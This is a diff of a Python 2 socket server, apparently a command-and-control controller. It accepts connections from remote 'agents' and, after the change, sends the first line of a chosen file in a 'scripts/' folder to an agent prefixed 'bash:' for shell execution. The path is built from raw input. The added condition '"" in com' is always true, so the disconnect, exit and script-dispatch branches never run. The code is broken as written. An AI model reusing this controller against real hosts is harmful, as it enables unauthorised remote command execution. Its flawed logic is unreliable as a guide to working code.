@@ -15,6 +15,7 @@ import json
 import pymongo
 import thread
 import time
+import os
 
 # --- configuration --- #
 host = ''
@@ -32,22 +33,31 @@ serv_socket.bind(addr)
 serv_socket.listen(max_host)
 
 def comandos(com):
-	commands = {'list_hosts',"get_info","help"}
-	if "list_hosts" in com:
-		print agents.keys()
+	path = "scripts/"
+	commands = next(os.walk("scripts/"))[2]
+	if "scripts" in com:
+		print commands
+	elif "" in com:
+		print "vazio"
 	elif "get_info" in com:
 		print "oi"
-	elif com == "help":
-		print commands
 	elif "disconnect" in com:		
 		hn = com.split(" ")[1]
 		agents[hn].send("disconnect")
+	elif "exit" in com:
+		exit()
+	else:
+		print com
+		f = open('scripts/'+com.split(" ")[0])
+		hn = com.split(" ")[1]
+		linha = f.readline()
+		agents[hn].send("bash:"+linha)
 
 def conexoes(lol):
 	print '[!] aguardando conexoes'
 	while True:
 		try:
-			con, con1 = serv_socket.accept()
+			con, caddr = serv_socket.accept()
 			recebe = con.recv(1024)
 			if recebe.startswith('[!] connected'):
 				hn = recebe.split('-')[1].strip().split(':')[0]
